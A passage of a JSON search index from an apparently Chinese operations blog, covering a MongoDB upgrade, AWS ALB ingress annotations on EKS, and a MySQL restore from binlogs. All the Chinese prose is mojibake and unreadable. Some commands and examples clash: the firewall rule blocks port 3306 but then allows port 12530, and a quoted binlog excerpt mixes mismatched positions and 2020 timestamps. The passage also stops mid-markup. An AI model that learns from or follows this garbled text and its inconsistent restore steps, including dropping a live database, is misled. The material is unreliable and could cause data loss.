æ•°æ®åº“\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emongodump -d message\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emongorestore --port \u003cspan class=\"m\"\u003e37017\u003c/span\u003e --drop --nsInclude\u003cspan class=\"o\"\u003e=\u003c/span\u003emessage.*\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"mongodb å¦‚ä½•å‡çº§"},{"content":"ç®¡ç†äº†ä¸€ä¸ªAWSçš„EKSé›†ç¾¤ï¼Œç”¨çš„æ˜¯ALBçš„è´Ÿè½½å‡è¡¡ï¼Œè¿™ä¸ªè´Ÿè½½å‡è¡¡å’ŒNginxæœ‰åŒºåˆ«ï¼Œæœ‰å¾ˆå¤šç‰¹æ®Šçš„åœ°æ–¹éœ€è¦æ³¨æ„ã€‚\nåŸºæœ¬éœ€è¦å®£å‘Šå¾ˆå¤šç‹¬æœ‰çš„ annotations\nä¸€ã€httpè‡ªåŠ¨è·³è½¬åˆ°https annotations: alb.ingress.kubernetes.io/actions.ssl-redirect: | {\u0026#34;Type\u0026#34;: \u0026#34;redirect\u0026#34;, \u0026#34;RedirectConfig\u0026#34;: { \u0026#34;Protocol\u0026#34;: \u0026#34;HTTPS\u0026#34;, \u0026#34;Port\u0026#34;: \u0026#34;443\u0026#34;, \u0026#34;StatusCode\u0026#34;: \u0026#34;HTTP_301\u0026#34;}} ...... - host: \u0026#39;*.bajie.dev\u0026#39; http: paths: - backend: service: name: ssl-redirect port: name: use-annotation path: / pathType: Prefix æ³¨æ„ï¼Œannotationäº†ä¸Šé¢ä¸€æ¡ï¼Œé‚£ä¹ˆåœ¨LBä¸­ï¼Œhttp 80çš„è§„åˆ™å°±åªå‰©ä¸‹è¿™ä¸€æ¡äº†ï¼Œå‹å€’ä¸€åˆ‡çš„è§„åˆ™ã€‚\nä¹‹åä½ å†annotationåˆ«çš„httpè§„åˆ™ï¼Œä¼šä¸ç”Ÿæ•ˆï¼›ä½ åªèƒ½å»annotition httpsçš„è§„åˆ™ã€‚\näºŒã€wwwé‡å®šå‘ ä¾‹å­ï¼š è¾“å…¥ rendoumi.comï¼Œä¼šè‡ªåŠ¨é‡å®šä¹‰åˆ° www.rendoumi.com\nannotations: alb.ingress.kubernetes.io/actions.www-redirect: | {\u0026#34;type\u0026#34;:\u0026#34;redirect\u0026#34;,\u0026#34;redirectConfig\u0026#34;:{\u0026#34;host\u0026#34;:\u0026#34;www.rendoumi.com\u0026#34;,\u0026#34;port\u0026#34;:\u0026#34;443\u0026#34;,\u0026#34;protocol\u0026#34;:\u0026#34;HTTPS\u0026#34;,\u0026#34;statusCode\u0026#34;:\u0026#34;HTTP_301\u0026#34;}} ...... - host: rendoumi.com http: paths: - backend: service: name: www-redirect port: name: use-annotation path: / pathType: Prefix è¿™ä¸ªæ˜¯ç›´æ¥301è·³è½¬åˆ°httpså»äº†\nä¸‰ã€external-dns ALB çš„ingressæœ‰ä¸ªå¤§å‘ï¼Œé‚£å°±æ˜¯å¦‚æœä½ å¤§åŠ¨ingressï¼Œå‰é¢çš„LBä¼šå‘ç”Ÿå˜åŒ–ï¼Œäº§ç”Ÿä¸€ä¸ªæ–°çš„LBã€‚è¿™ç‚¹éå¸¸è¦å‘½ï¼Œç¬¬ä¸€æ¬¡é‡åˆ°çš„æ—¶å€™ï¼Œå…«æˆ’è¢«è¿«æ”¹æ‰äº†Route53çš„å¥½å¤šæ¡DNSè®°å½•ï¼Œæ“¦çš„\næ‰€ä»¥åŠ¡å¿…æŠŠè¿™ä¸ªåŠ ä¸Šï¼Œé¿å…å¼•èµ·è”åŠ¨ï¼Œåæ­£æ— æ‰€è°“ï¼Œæ²¡è£…external-dnsçš„è¯annotationçš„ä¸èµ·ä½œç”¨\nannotations: external-dns.alpha.kubernetes.io/hostname: rendoumi.com,www.rendoumi.com,*.rendoumi.com æŠŠè¦ç®¡ç†çš„åŸŸåç”¨é€—å·åˆ†å¼€\nå››ã€groupå±æ€§ è¿™ä¸ªå°±æ˜¯ä¸Šé¢æ‰€è¯´çš„å¤§æ”¹åŠ¨ï¼ŒåŠ è¿™ä¸ªå±æ€§å¿…ç„¶å¼•èµ·æ›´æ¢LB\nè¿™ä¸ªåœºæ™¯ä¹Ÿæ˜¯å¿…é¡»çš„ï¼Œä¸¾ä¾‹æ¥è¯´ï¼Œä¸åŒçš„namespaceä¸­çš„ingresséƒ½è¦ç”¨åˆ°åŒä¸€ä¸ªåŸŸå\nè¿™æ ·å°±éº»çƒ¦äº†ï¼Œnginx ingressç®€å•åŠ ä¸ªnamespaceå°±å¯ä»¥äº†ï¼Œalbä¸è¡Œ\néœ€è¦æ˜¾å¼å£°æ˜ group å±æ€§\nannotations: alb.ingress.kubernetes.io/group.name: rendoumi alb.ingress.kubernetes.io/group.order: \u0026#34;100\u0026#34; æ³¨æ„ï¼Œä¸¤ä¸ªå±æ€§åŠ¡å¿…åœ¨ä¸€èµ·ï¼Œ orderç¼ºçœæ˜¯0ï¼Œæœ€å¤§1000\nè¿™æ ·LBä¼šæŠŠä¸åŒnsä¸­çš„ingressèšåˆæˆä¸€ä¸ªLBæ¥ä½¿ç”¨\næœ€åï¼Œç»™ä¸ªå®Œå…¨çš„ä¾‹å­ï¼š\napiVersion: networking.k8s.io/v1 kind: Ingress metadata: annotations: alb.ingress.kubernetes.io/actions.ssl-redirect: | {\u0026#34;Type\u0026#34;: \u0026#34;redirect\u0026#34;, \u0026#34;RedirectConfig\u0026#34;: { \u0026#34;Protocol\u0026#34;: \u0026#34;HTTPS\u0026#34;, \u0026#34;Port\u0026#34;: \u0026#34;443\u0026#34;, \u0026#34;StatusCode\u0026#34;: \u0026#34;HTTP_301\u0026#34;}} alb.ingress.kubernetes.io/actions.www-redirect: | {\u0026#34;type\u0026#34;:\u0026#34;redirect\u0026#34;,\u0026#34;redirectConfig\u0026#34;:{\u0026#34;host\u0026#34;:\u0026#34;www.bajie.dev\u0026#34;,\u0026#34;port\u0026#34;:\u0026#34;443\u0026#34;,\u0026#34;protocol\u0026#34;:\u0026#34;HTTPS\u0026#34;,\u0026#34;statusCode\u0026#34;:\u0026#34;HTTP_301\u0026#34;}} alb.ingress.kubernetes.io/certificate-arn: arn:aws:acm:ap-southeast-1:000007118436:certificate/xxxxa910-46c9-4680-929a-99996deb98df alb.ingress.kubernetes.io/group.name: bajie alb.ingress.kubernetes.io/group.order: \u0026#34;100\u0026#34; alb.ingress.kubernetes.io/listen-ports: \u0026#39;[{\u0026#34;HTTP\u0026#34;: 80}, {\u0026#34;HTTPS\u0026#34;:443}]\u0026#39; alb.ingress.kubernetes.io/scheme: internet-facing alb.ingress.kubernetes.io/ssl-policy: ELBSecurityPolicy-TLS-1-1-2017-01 alb.ingress.kubernetes.io/ssl-redirect: \u0026#34;443\u0026#34; alb.ingress.kubernetes.io/subnets: subnet-99996c43cb399f55c,subnet-9999c9681d11a3323,subnet-99999874db9639a77 alb.ingress.kubernetes.io/target-type: ip external-dns.alpha.kubernetes.io/hostname: bajie.dev,www.bajie.dev,*.bajie.dev namespace: default spec: ingressClassName: alb rules: - host: official.bajie.dev http: paths: - backend: service: name: dc-official-client port: number: 3000 path: / pathType: Prefix - host: bajie.dev http: paths: - backend: service: name: www-redirect port: name: use-annotation path: / pathType: Prefix - host: \u0026#39;*.bajie.dev\u0026#39; http: paths: - backend: service: name: ssl-redirect port: name: use-annotation path: / pathType: Prefix tls: - hosts: - bajie.dev - www.bajie.dev - official.bajie.dev æˆ‘ä»¬åœ¨å¦å¤–ä¸€ä¸ªnamespace annotatitonä¸€ä¸ª ingresså°±æ˜¯è¿™æ ·çš„\napiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: grafana namespace: prometheus annotations: alb.ingress.kubernetes.io/group.name: bajie alb.ingress.kubernetes.io/group.order: \u0026#39;10\u0026#39; alb.ingress.kubernetes.io/scheme: internet-facing alb.ingress.kubernetes.io/target-type: ip alb.ingress.kubernetes.io/certificate-arn: arn:aws:acm:ap-southeast-1:533267118436:certificate/e6c3a910-46c9-4680-929a-d60d6deb98df external-dns.alpha.kubernetes.io/hostname: grafana.bajie.dev spec: ingressClassName: alb rules: - host: grafana.bajie.dev http: paths: - path: / pathType: Prefix backend: service: name: stable-grafana port: number: 80 tls: - hosts: - grafana.bajie.dev æ³¨æ„ orderï¼Œgrafanaçš„orderæ˜¯10ï¼Œè€Œä¸Šé¢æ˜¯100ï¼Œæ‰€ä»¥grafanaçš„è®°å½•ä¼šå‡ºç°åœ¨*ä¹‹å‰ï¼Œå¦åˆ™ï¼Œå°±é¦–å…ˆè¢« æ˜Ÿå· æ‹¦æˆªï¼Œç„¶åæ‰åˆ° grafanaçš„è·¯å¾„ï¼Œå°±ä¸å¯¹äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20250120-aws_alb_ingress/","summary":"\u003cp\u003eç®¡ç†äº†ä¸€ä¸ªAWSçš„EKSé›†ç¾¤ï¼Œç”¨çš„æ˜¯ALBçš„è´Ÿè½½å‡è¡¡ï¼Œè¿™ä¸ªè´Ÿè½½å‡è¡¡å’ŒNginxæœ‰åŒºåˆ«ï¼Œæœ‰å¾ˆå¤šç‰¹æ®Šçš„åœ°æ–¹éœ€è¦æ³¨æ„ã€‚\u003c/p\u003e\n\u003cp\u003eåŸºæœ¬éœ€è¦å®£å‘Šå¾ˆå¤šç‹¬æœ‰çš„ annotations\u003c/p\u003e\n\u003ch4 id=\"ä¸€httpè‡ªåŠ¨è·³è½¬åˆ°https\"\u003eä¸€ã€httpè‡ªåŠ¨è·³è½¬åˆ°https\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  annotations:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    alb.ingress.kubernetes.io/actions.ssl-redirect: \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Type\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;redirect\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;RedirectConfig\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Protocol\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;HTTPS\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;Port\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;443\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;StatusCode\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;HTTP_301\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e}}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  - host: \u003cspan class=\"s1\"\u003e\u0026#39;*.bajie.dev\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    http:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      paths:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - backend:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          service:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            name: ssl-redirect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            port:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e              name: use-annotation\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        path: /\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        pathType: Prefix     \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼Œannotationäº†ä¸Šé¢ä¸€æ¡ï¼Œé‚£ä¹ˆåœ¨LBä¸­ï¼Œhttp 80çš„è§„åˆ™å°±åªå‰©ä¸‹è¿™ä¸€æ¡äº†ï¼Œå‹å€’ä¸€åˆ‡çš„è§„åˆ™ã€‚\u003c/p\u003e\n\u003cp\u003eä¹‹åä½ å†annotationåˆ«çš„httpè§„åˆ™ï¼Œä¼šä¸ç”Ÿæ•ˆï¼›ä½ åªèƒ½å»annotition httpsçš„è§„åˆ™ã€‚\u003c/p\u003e\n\u003ch4 id=\"äºŒwwwé‡å®šå‘\"\u003eäºŒã€wwwé‡å®šå‘\u003c/h4\u003e\n\u003cp\u003eä¾‹å­ï¼š  è¾“å…¥ rendoumi.comï¼Œä¼šè‡ªåŠ¨é‡å®šä¹‰åˆ° \u003ca href=\"https://www.rendoumi.com\"\u003ewww.rendoumi.com\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  annotations:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    alb.ingress.kubernetes.io/actions.www-redirect: \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026#34;redirect\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;redirectConfig\u0026#34;\u003c/span\u003e:\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026#34;www.rendoumi.com\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;port\u0026#34;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026#34;443\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;protocol\u0026#34;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026#34;HTTPS\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;statusCode\u0026#34;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026#34;HTTP_301\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e}}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  - host: rendoumi.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    http:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      paths:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - backend:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          service:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            name: www-redirect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            port:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e              name: use-annotation\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        path: /\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        pathType: Prefix\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™ä¸ªæ˜¯ç›´æ¥301è·³è½¬åˆ°httpså»äº†\u003c/p\u003e","title":"AWS alb è´Ÿè½½å‡è¡¡åšingressçš„æ³¨æ„äº‹é¡¹"},{"content":"åŒäº‹ä¸Šçº¿ï¼ŒæŠŠæ•°æ®åº“åˆå§‹åŒ–è„šæœ¬æ”¹äº†åã€‚ç»“æœå¯¼è‡´ä¸Šçº¿æŠŠåº“è¡¨çš„æ•°æ®å…¨ç»™é‡æ–°åˆå§‹åŒ–äº†ã€‚è¿™ä¸‹äº‹æ¥äº†ï¼Œæ¢å¤åº“è¡¨ã€‚\nä¹‹å‰ç”¨è¿‡é˜¿é‡Œäº‘çš„åº“è¡¨æ¢å¤ï¼Œéå¸¸ç®€æ´ï¼Œé‚£è¿™æ¬¡ä¹Ÿç…§çŒ«ç”»è™å­¦ä¸€å›ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€ä¿å­˜ç°åœ¨çš„è®°å½•ï¼š\næŠŠæ‰€æœ‰ç›¸å…³çš„binlogæ‹·è´åˆ°ä¸€ä¸ªå¤‡ä»½ç›®å½•ä¿å­˜ã€‚\näºŒã€æœ€å¥½æ–°å»ºä¸€ä¸ªmysqlå®ä¾‹ï¼š\né˜¿é‡Œç¡®å®äº‹æ–°èµ·äº†ä¸€ä¸ªå®ä¾‹ï¼Œé¿å…æ“ä½œå¯¹æ—§å®ä¾‹é€ æˆå½±å“ã€‚\næˆ‘ä»¬å®æˆ˜ä¸­å¯èƒ½æ²¡å¿…è¦ï¼Œä½†ä¹Ÿè¦å°é”æ•°æ®åº“çš„è¯»å†™ï¼š\niptables -I INPUT -p tcp --dport 3306 -j DROP # æŠŠè‡ªå·±æ”¾é€šï¼Œåç»­å¯èƒ½è‡ªå·±è¦è¿›è¡Œ mysql æˆ– mysqldump çš„æ“ä½œ iptables -I INPUT -s 127.0.0.1/32 -p tcp --dport 12530 -j ACCEPT ä¸‰ã€è§£æbinlog\næˆ‘ä»¬éœ€è¦æŠŠé‡æ”¾æ—¥å¿—æ‹¿å‡ºæ¥ï¼š\nmysqlbinlog --start-datetime=\u0026#34;2025-01-02 14:40:00\u0026#34; --stop-datetime=\u0026#34;2025-01-02 14:50:00\u0026#34; --verbose binlog.000009 |grep -i -C15 \u0026#34;drop table\u0026#34;|more mysqlbinlog binlog.000009 --stop-position=260734003 --database=work_oa \u0026gt; 9.sql æ³¨æ„ï¼Œåˆ†æï¼šçœ‹åˆ° at 260734003 ä¸‹é¢æœ‰ä¸ª drop table ï¼Œè¯´æ˜æ˜¯åœ¨ 260734003 ä¹‹åå‘ç”Ÿäº† drop table æ“ä½œ æ‰€ä»¥ï¼Œå›æ”¾åˆ°260734003å°±å¯ä»¥äº†ã€‚ä¹‹åã€ä¹‹åã€ä¹‹åæ‰æ“ä½œçš„ï¼ï¼ï¼ /*!80014 SET @@session.original_server_version=80019*//*!*/; /*!80014 SET @@session.immediate_server_version=80019*//*!*/; SET @@SESSION.GTID_NEXT= \u0026#39;ANONYMOUS\u0026#39;/*!*/; # at 260734003 #200311 20:06:20 server id 1 end_log_pos 355 CRC32 0x2fc1e5ea Query\tthread_id=16\texec_time=0\terror_code=0 SET TIMESTAMP=1583971580/*!*/; SET @@session.pseudo_thread_id=16/*!*/; SET @@session.foreign_key_checks=1, @@session.sql_auto_is_null=0, @@session.unique_checks=1, @@session.autocommit=1/*!*/; SET @@session.sql_mode=1168113696/*!*/; SET @@session.auto_increment_increment=1, @@session.auto_increment_offset=1/*!*/; /*!\\C utf8mb4 *//*!*/; SET @@session.character_set_client=255,@@session.collation_connection=255,@@session.collation_server=255/*!*/; SET @@session.lc_time_names=0/*!*/; SET @@session.collation_database=DEFAULT/*!*/; /*!80011 SET @@session.default_collation_for_utf8mb4=255*//*!*/; DROP TABLE `pets`.`cats` /* generated by server */ /*!*/; # at 260734009 #200311 20:07:48 server id 1 end_log_pos 434 CRC32 0x123d65df Anonymous_GTID\tlast_committed=1\tsequence_number=2\trbr_only=no\toriginal_committed_timestamp=1583971668462467\timmediate_commit_timestamp=1583971668462467\ttransaction_length=473 # original_commit_timestamp=1583971668462467 (2020-03-11 20:07:48.462467 EDT) # immediate_commit_timestamp=1583971668462467 (2020-03-11 20:07:48.462467 EDT) /*!80001 SET @@session.original_commit_timestamp=1583971668462467*//*!*/; /*!80014 SET @@session.original_server_version=80019*//*!*/; /*!80014 SET @@session.immediate_server_version=80019*//*!*/; SET @@SESSION.GTID_NEXT= \u0026#39;ANONYMOUS\u0026#39;/*!*/; # at 260734188 #200311 20:07:48 server id 1 end_log_pos 828 CRC32 0x57fac9ac Query\tthread_id=16\texec_time=0\terror_code=0\tXid = 217 use `pets`/*!*/; SET TIMESTAMP=1583971668/*!*/; /*!80013 SET @@session.sql_require_primary_key=0*//*!*/; CREATE TABLE dogs æˆ‘ä»¬è¿˜æ˜¯å…ˆæ‰¾åˆ° binlog ä¸­ drop table ä¹‹ç±»çš„æ“ä½œå­—æ ·ï¼Œç„¶åç¡®å®š position åï¼ŒæŠŠ binlog.00009 ä¸­ä¹‹å‰çš„ log å¯¼å‡ºã€‚\nåˆ«å¿˜è®°äº†ï¼Œ å‰é¢è¿˜æœ‰8ä¸ªbinlog\nmysqlbinlog -d work_oa binlog.000001 \u0026gt; 1.sql mysqlbinlog -d work_oa binlog.000002 \u0026gt; 2.sql mysqlbinlog -d work_oa binlog.000003 \u0026gt; 3.sql mysqlbinlog -d work_oa binlog.000004 \u0026gt; 4.sql mysqlbinlog -d work_oa binlog.000005 \u0026gt; 5.sql mysqlbinlog -d work_oa binlog.000006 \u0026gt; 6.sql mysqlbinlog -d work_oa binlog.000007 \u0026gt; 7.sql mysqlbinlog -d work_oa binlog.000008 \u0026gt; 8.sql ç„¶åè¿˜è¦çœ‹ *.sql çš„å¤§å°ï¼Œå‘ç°éƒ½æ˜¯1.7Gï¼Œ1.6G\nå››ã€æ¢å¤\næ³¨æ„ä¸Šä¸€èŠ‚å…³æ³¨çš„æ–‡ä»¶å¤§å°ã€‚æˆ‘ä»¬éœ€è¦ä¿®æ”¹2ä¸ªåœ°æ–¹ï¼š\n1ã€æœåŠ¡å™¨ï¼Œbinlogå¯¼å‡ºçš„æ–‡ä»¶ï¼Œå¯¼å…¥æœåŠ¡å™¨çš„æ—¶å€™æ•°æ®åŒ…ä¼šéå¸¸å¤§ï¼Œæ‰€ä»¥1.7Gæ–‡ä»¶ï¼Œæœ€å¥½æ”¾å¤§åˆ°2G\ncat /etc/my.cnf [mysqld] max_allowed_packet=2048M 2ã€å®¢æˆ·ç«¯å¯¼å…¥\n# å› ä¸ºæ˜¯ç›´æ¥åœ¨è€åº“ä¸Šæ“ä½œï¼Œæ‰€ä»¥å¿…é¡»å…ˆå¹²æ‰åº“ drop database work_oa # æ¢å¤ mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 1.sql mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 2.sql mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 3.sql mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 4.sql mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 5.sql mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 6.sql mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 7.sql mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 8.sql mysql --max_allowed_packet=100M -u root -p work_oa \u0026lt; 9.sql è¿™æ ·å°±æ¢å¤å®Œäº†ã€‚å¦‚æœæ˜¯åœ¨é˜¿é‡Œäº‘ï¼Œé‚£å°±æ˜¯æ¢å¤åˆ°äº†ä¸€ä¸ªæ–°å®ä¾‹çš„æ–°åº“é‡Œï¼Œç„¶ååœ¨æŠŠåº“è¡¨å¯¼å‡ºï¼Œå†å¯¼å…¥åˆ°è€åº“ä¸­ï¼Œå°±æ˜¯ä¸€ä¸ªå®Œç¾çš„æ¢å¤äº†ã€‚\nå–„åäº‹å®œï¼š\nä¸€å®šè¦åšä¸ªfull backupï¼š\nmysqldump -uroot -p -h 127.0.0.1 -P3306 --opt --triggers -R --hex-blob --single-transaction --flush-logs --master-data=2 --all-databases \u0026gt; all-20250103.sql åšå®ŒåæŸ¥çœ‹ all-20250103.sql\nè¯´æ˜è¿™ä¸ªå¤‡ä»½æ˜¯ä» binlog.000031 å¼€å§‹çš„ï¼Œä¹‹å‰çš„éƒ½å¯ä»¥ä¸è¦äº†ï¼Œsoï¼Œåˆ é™¤ä¹‹å‰çš„ï¼Œåªä¿ç•™000031ä¹‹åçš„ï¼š\nPURGE BINARY LOGS TO \u0026#39;binlog.000031\u0026#39;; ","permalink":"https://rendoumi.com/posts/20250103-msyql_restore/","summary":"\u003cp\u003eåŒäº‹ä¸Šçº¿ï¼ŒæŠŠæ•°æ®åº“åˆå§‹åŒ–è„šæœ¬æ”¹äº†åã€‚ç»“æœå¯¼è‡´ä¸Šçº¿æŠŠåº“è¡¨çš„æ•°æ®å…¨ç»™é‡æ–°åˆå§‹åŒ–äº†ã€‚è¿™ä¸‹äº‹æ¥äº†ï¼Œæ¢å¤åº“è¡¨ã€‚\u003c/p\u003e\n\u003cp\u003eä¹‹å‰ç”¨è¿‡é˜¿é‡Œäº‘çš„åº“è¡¨æ¢å¤ï¼Œéå¸¸ç®€æ´ï¼Œé‚£è¿™æ¬¡ä¹Ÿç…§çŒ«ç”»è™å­¦ä¸€å›ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€ä¿å­˜ç°åœ¨çš„è®°å½•ï¼š\u003c/p\u003e\n\u003cp\u003eæŠŠæ‰€æœ‰ç›¸å…³çš„binlogæ‹·è´åˆ°ä¸€ä¸ªå¤‡ä»½ç›®å½•ä¿å­˜ã€‚\u003c/p\u003e\n\u003cp\u003eäºŒã€æœ€å¥½æ–°å»ºä¸€ä¸ªmysqlå®ä¾‹ï¼š\u003c/p\u003e\n\u003cp\u003eé˜¿é‡Œç¡®å®äº‹æ–°èµ·äº†ä¸€ä¸ªå®ä¾‹ï¼Œé¿å…æ“ä½œå¯¹æ—§å®ä¾‹é€ æˆå½±å“ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬å®æˆ˜ä¸­å¯èƒ½æ²¡å¿…è¦ï¼Œä½†ä¹Ÿè¦å°é”æ•°æ®åº“çš„è¯»å†™ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -I INPUT -p tcp --dport \u003cspan class=\"m\"\u003e3306\u003c/span\u003e -j DROP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æŠŠè‡ªå·±æ”¾é€šï¼Œåç»­å¯èƒ½è‡ªå·±è¦è¿›è¡Œ mysql æˆ– mysqldump çš„æ“ä½œ\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -I INPUT -s 127.0.0.1/32 -p tcp --dport \u003cspan class=\"m\"\u003e12530\u003c/span\u003e -j ACCEPT\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸‰ã€è§£æbinlog\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬éœ€è¦æŠŠé‡æ”¾æ—¥å¿—æ‹¿å‡ºæ¥ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan 